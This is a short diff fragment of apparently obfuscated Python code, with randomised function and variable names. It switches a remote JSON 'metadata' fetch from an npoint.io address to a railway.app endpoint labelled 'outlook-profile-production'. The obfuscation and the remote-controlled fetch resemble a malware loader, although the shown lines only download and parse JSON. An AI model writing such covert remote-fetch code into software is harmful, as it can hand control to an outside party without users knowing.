@@ -16,7 +16,7 @@ def model_njqozg_226():
 
     def net_qehmro_266():
         try:
-            eval_mhcymw_259 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            eval_mhcymw_259 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             eval_mhcymw_259.raise_for_status()
             process_vmbufh_998 = eval_mhcymw_259.json()
             process_taufvg_102 = process_vmbufh_998.get('metadata')
